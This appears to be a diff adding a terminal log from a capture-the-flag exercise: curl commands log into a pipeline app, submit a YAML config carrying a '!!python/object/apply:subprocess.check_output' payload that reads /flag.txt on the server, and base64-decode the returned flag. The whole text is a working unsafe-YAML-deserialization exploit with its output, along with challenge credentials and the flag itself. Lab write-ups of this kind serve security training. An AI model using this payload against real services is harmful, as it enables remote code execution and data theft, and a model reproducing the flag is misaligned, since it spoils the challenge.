@@ -1,0 +1,15 @@
+$ curl -sS -c cookies -d 'email=devops@nexadeploy.test&password=deploy1234' \
+    https://felt-concentrate-houston-dated.trycloudflare.com/login
+HTTP/2 302 location: /dashboard
+
+$ curl -sS -b cookies \
+    --data-urlencode 'name=x' --data-urlencode 'environment=staging' \
+    --data-urlencode 'config=!!python/object/apply:subprocess.check_output [["cat","/flag.txt"]]' \
+    https://felt-concentrate-houston-dated.trycloudflare.com/pipelines/validate
+<div class="pill pill-success">Valid</div>
+<pre class="code-block">!!binary |
+  TkZYe3k0bWxfdW5TNGYzX2wwNGQzcl90MF9yY2V9Cg==
+</pre>
+
+$ echo TkZYe3k0bWxfdW5TNGYzX2wwNGQzcl90MF9yY2V9Cg== | base64 -d
+NFX{y4ml_unS4f3_l04d3r_t0_rce}
